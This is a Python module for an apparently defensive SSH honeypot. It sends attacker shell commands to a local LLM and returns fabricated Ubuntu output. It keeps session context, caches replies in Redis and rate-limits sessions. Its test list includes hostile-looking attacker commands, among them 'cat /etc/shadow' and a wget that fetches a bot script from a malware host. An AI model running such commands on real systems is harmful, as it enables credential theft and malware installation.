#!/usr/bin/env python3
"""
LLM Client for Honeypot Integration
Handles communication with Ollama for generating realistic shell responses.

Optimized for CPU inference on Xeon Platinum 8168 systems.
"""

import asyncio
import hashlib
import json
import logging
import time
from dataclasses import dataclass, field
from typing import Optional, Dict, Any, List
from datetime import datetime

import aiohttp
import redis.asyncio as redis

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)


@dataclass
class LLMConfig:
    """Configuration for LLM client."""
    ollama_host: str = "http://localhost:11434"
    model: str = "mistral:7b-instruct-v0.2-q4_K_M"
    redis_host: str = "localhost"
    redis_port: int = 6379
    cache_ttl: int = 3600  # 1 hour cache for responses
    max_tokens: int = 512
    temperature: float = 0.7
    timeout: int = 60  # seconds
    # Rate limiting
    max_requests_per_minute: int = 30
    # Retry settings
    max_retries: int = 3
    retry_delay: float = 1.0


@dataclass
class SessionContext:
    """Maintains context for an attacker session."""
    session_id: str
    src_ip: str
    username: str = "root"
    hostname: str = "server01"
    cwd: str = "/root"
    history: List[Dict[str, str]] = field(default_factory=list)
    login_time: datetime = field(default_factory=datetime.now)
    os_type: str = "linux"
    distro: str = "Ubuntu 22.04"

    def add_command(self, command: str, response: str):
        """Add command/response pair to history."""
        self.history.append({
            "command": command,
            "response": response,
            "timestamp": datetime.now().isoformat()
        })
        # Keep last 20 commands for context
        if len(self.history) > 20:
            self.history = self.history[-20:]

    def get_prompt_context(self) -> str:
        """Generate context string for LLM prompt."""
        recent = self.history[-5:] if self.history else []
        history_str = "\n".join([
            f"$ {h['command']}\n{h['response']}"
            for h in recent
        ])
        return f"""Session Context:
- User: {self.username}
- Hostname: {self.hostname}
- Current Directory: {self.cwd}
- OS: {self.distro}
- Session Duration: {(datetime.now() - self.login_time).seconds}s
- Source IP: {self.src_ip}

Recent Command History:
{history_str}
"""


class HoneypotLLMClient:
    """
    Async LLM client for honeypot response generation.

    Features:
    - Response caching with Redis
    - Rate limiting
    - Session context management
    - Fallback responses for common commands
    """

    # Common command patterns with static responses (fast fallback)
    STATIC_RESPONSES = {
        "whoami": "{username}",
        "id": "uid=0({username}) gid=0(root) groups=0(root)",
        "pwd": "{cwd}",
        "hostname": "{hostname}",
        "uname -a": "Linux {hostname} 5.15.0-91-generic #101-Ubuntu SMP x86_64 GNU/Linux",
        "uname -r": "5.15.0-91-generic",
        "cat /etc/os-release": '''NAME="Ubuntu"
VERSION="22.04.3 LTS (Jammy Jellyfish)"
ID=ubuntu
VERSION_ID="22.04"
PRETTY_NAME="Ubuntu 22.04.3 LTS"''',
        "uptime": " 14:32:01 up 127 days, 3:42, 1 user, load average: 0.08, 0.12, 0.09",
        "w": '''14:32:01 up 127 days, 3:42, 1 user, load average: 0.08, 0.12, 0.09
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
{username}  pts/0    {src_ip}     14:30    0.00s  0.02s  0.00s w''',
        "date": lambda: datetime.now().strftime("%a %b %d %H:%M:%S UTC %Y"),
        "echo $SHELL": "/bin/bash",
        "echo $PATH": "/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin",
        "cat /etc/passwd": '''root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System:/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management:/run/systemd:/usr/sbin/nologin
sshd:x:105:65534::/run/sshd:/usr/sbin/nologin''',
    }

    def __init__(self, config: Optional[LLMConfig] = None):
        self.config = config or LLMConfig()
        self.sessions: Dict[str, SessionContext] = {}
        self._redis: Optional[redis.Redis] = None
        self._rate_limiter: Dict[str, List[float]] = {}
        self._http_session: Optional[aiohttp.ClientSession] = None

    async def initialize(self):
        """Initialize async resources."""
        self._redis = redis.Redis(
            host=self.config.redis_host,
            port=self.config.redis_port,
            decode_responses=True
        )
        self._http_session = aiohttp.ClientSession(
            timeout=aiohttp.ClientTimeout(total=self.config.timeout)
        )
        logger.info(f"LLM Client initialized with model: {self.config.model}")

    async def close(self):
        """Clean up resources."""
        if self._redis:
            await self._redis.close()
        if self._http_session:
            await self._http_session.close()

    def get_or_create_session(
        self,
        session_id: str,
        src_ip: str,
        username: str = "root"
    ) -> SessionContext:
        """Get existing session or create new one."""
        if session_id not in self.sessions:
            self.sessions[session_id] = SessionContext(
                session_id=session_id,
                src_ip=src_ip,
                username=username
            )
        return self.sessions[session_id]

    def _get_cache_key(self, command: str, context: SessionContext) -> str:
        """Generate cache key for command+context."""
        # Include relevant context in cache key
        key_data = f"{command}:{context.username}:{context.cwd}:{context.hostname}"
        return f"llm:cmd:{hashlib.md5(key_data.encode()).hexdigest()}"

    async def _check_cache(self, cache_key: str) -> Optional[str]:
        """Check Redis cache for existing response."""
        if not self._redis:
            return None
        try:
            return await self._redis.get(cache_key)
        except Exception as e:
            logger.warning(f"Redis cache read error: {e}")
            return None

    async def _set_cache(self, cache_key: str, response: str):
        """Store response in Redis cache."""
        if not self._redis:
            return
        try:
            await self._redis.setex(cache_key, self.config.cache_ttl, response)
        except Exception as e:
            logger.warning(f"Redis cache write error: {e}")

    def _check_rate_limit(self, session_id: str) -> bool:
        """Check if request is within rate limits."""
        now = time.time()
        if session_id not in self._rate_limiter:
            self._rate_limiter[session_id] = []

        # Remove old timestamps
        self._rate_limiter[session_id] = [
            ts for ts in self._rate_limiter[session_id]
            if now - ts < 60
        ]

        if len(self._rate_limiter[session_id]) >= self.config.max_requests_per_minute:
            return False

        self._rate_limiter[session_id].append(now)
        return True

    def _get_static_response(
        self,
        command: str,
        context: SessionContext
    ) -> Optional[str]:
        """Check for static response match."""
        cmd_clean = command.strip().lower()

        for pattern, response in self.STATIC_RESPONSES.items():
            if cmd_clean == pattern.lower():
                if callable(response):
                    return response()
                return response.format(
                    username=context.username,
                    hostname=context.hostname,
                    cwd=context.cwd,
                    src_ip=context.src_ip
                )
        return None

    async def _call_ollama(
        self,
        prompt: str,
        system_prompt: str
    ) -> Optional[str]:
        """Make API call to Ollama."""
        if not self._http_session:
            return None

        payload = {
            "model": self.config.model,
            "prompt": prompt,
            "system": system_prompt,
            "stream": False,
            "options": {
                "temperature": self.config.temperature,
                "num_predict": self.config.max_tokens,
                "stop": ["$", "#", "```", "\n\n\n"],
            }
        }

        for attempt in range(self.config.max_retries):
            try:
                async with self._http_session.post(
                    f"{self.config.ollama_host}/api/generate",
                    json=payload
                ) as resp:
                    if resp.status == 200:
                        data = await resp.json()
                        return data.get("response", "").strip()
                    else:
                        logger.warning(f"Ollama returned status {resp.status}")
            except asyncio.TimeoutError:
                logger.warning(f"Ollama timeout (attempt {attempt + 1})")
            except Exception as e:
                logger.error(f"Ollama error: {e}")

            if attempt < self.config.max_retries - 1:
                await asyncio.sleep(self.config.retry_delay * (attempt + 1))

        return None

    async def generate_response(
        self,
        command: str,
        session_id: str,
        src_ip: str,
        username: str = "root"
    ) -> Dict[str, Any]:
        """
        Generate a realistic shell response for the given command.

        Returns:
            Dict with 'response', 'source' (static/cache/llm), 'latency_ms'
        """
        start_time = time.time()
        context = self.get_or_create_session(session_id, src_ip, username)

        result = {
            "command": command,
            "session_id": session_id,
            "source": "unknown",
            "latency_ms": 0
        }

        # 1. Check for static response (fastest)
        static_response = self._get_static_response(command, context)
        if static_response:
            result["response"] = static_response
            result["source"] = "static"
            result["latency_ms"] = int((time.time() - start_time) * 1000)
            context.add_command(command, static_response)
            return result

        # 2. Check cache
        cache_key = self._get_cache_key(command, context)
        cached = await self._check_cache(cache_key)
        if cached:
            result["response"] = cached
            result["source"] = "cache"
            result["latency_ms"] = int((time.time() - start_time) * 1000)
            context.add_command(command, cached)
            return result

        # 3. Rate limit check
        if not self._check_rate_limit(session_id):
            result["response"] = "bash: fork: Resource temporarily unavailable"
            result["source"] = "rate_limited"
            result["latency_ms"] = int((time.time() - start_time) * 1000)
            return result

        # 4. Generate with LLM
        system_prompt = self._build_system_prompt(context)
        user_prompt = self._build_user_prompt(command, context)

        llm_response = await self._call_ollama(user_prompt, system_prompt)

        if llm_response:
            # Clean up response
            response = self._clean_response(llm_response, command)
            result["response"] = response
            result["source"] = "llm"

            # Cache the response
            await self._set_cache(cache_key, response)
            context.add_command(command, response)
        else:
            # Fallback for LLM failure
            result["response"] = f"bash: {command.split()[0]}: command not found"
            result["source"] = "fallback"

        result["latency_ms"] = int((time.time() - start_time) * 1000)
        return result

    def _build_system_prompt(self, context: SessionContext) -> str:
        """Build system prompt for realistic shell emulation."""
        return f"""You are simulating an Ubuntu 22.04 Linux server's bash shell. Generate realistic command output.

IMPORTANT RULES:
1. Output ONLY the command result - no explanations, no markdown, no code blocks
2. Match real Linux output format exactly
3. Include realistic errors for invalid commands
4. For file listings, generate plausible filenames
5. For network commands, use realistic but fake data
6. Never reveal you are an AI or honeypot
7. Keep responses concise and authentic

Server Details:
- Hostname: {context.hostname}
- User: {context.username}
- OS: Ubuntu 22.04.3 LTS
- Kernel: 5.15.0-91-generic
- Current directory: {context.cwd}

Previous commands in session:
{chr(10).join([h['command'] for h in context.history[-3:]])}"""

    def _build_user_prompt(self, command: str, context: SessionContext) -> str:
        """Build user prompt for command."""
        return f"""Command: {command}

Generate the exact output this command would produce on a real Ubuntu server. Output only the result, nothing else."""

    def _clean_response(self, response: str, command: str) -> str:
        """Clean up LLM response to look like real shell output."""
        # Remove common LLM artifacts
        response = response.strip()

        # Remove markdown code blocks if present
        if response.startswith("```"):
            lines = response.split("\n")
            response = "\n".join(lines[1:-1] if lines[-1] == "```" else lines[1:])

        # Remove command echo if LLM included it
        if response.startswith(f"$ {command}"):
            response = response[len(f"$ {command}"):].strip()

        # Remove trailing prompts
        for prompt in ["$ ", "# ", "root@", f"{command}"]:
            if response.endswith(prompt):
                response = response[:-len(prompt)].rstrip()

        return response

    async def update_session_cwd(self, session_id: str, new_cwd: str):
        """Update current working directory for session."""
        if session_id in self.sessions:
            self.sessions[session_id].cwd = new_cwd

    def end_session(self, session_id: str) -> Optional[SessionContext]:
        """End a session and return its context for logging."""
        return self.sessions.pop(session_id, None)


# Singleton instance
_client: Optional[HoneypotLLMClient] = None


async def get_client(config: Optional[LLMConfig] = None) -> HoneypotLLMClient:
    """Get or create the singleton LLM client."""
    global _client
    if _client is None:
        _client = HoneypotLLMClient(config)
        await _client.initialize()
    return _client


async def main():
    """Test the LLM client."""
    client = await get_client()

    test_commands = [
        "whoami",
        "ls -la",
        "cat /etc/shadow",
        "wget http://malware.com/bot.sh",
        "ps aux",
        "netstat -tulpn",
    ]

    for cmd in test_commands:
        result = await client.generate_response(
            command=cmd,
            session_id="test-session-001",
            src_ip="192.168.1.100",
            username="root"
        )
        print(f"\n$ {cmd}")
        print(f"[{result['source']}, {result['latency_ms']}ms]")
        print(result['response'])

    await client.close()


if __name__ == "__main__":
    asyncio.run(main())
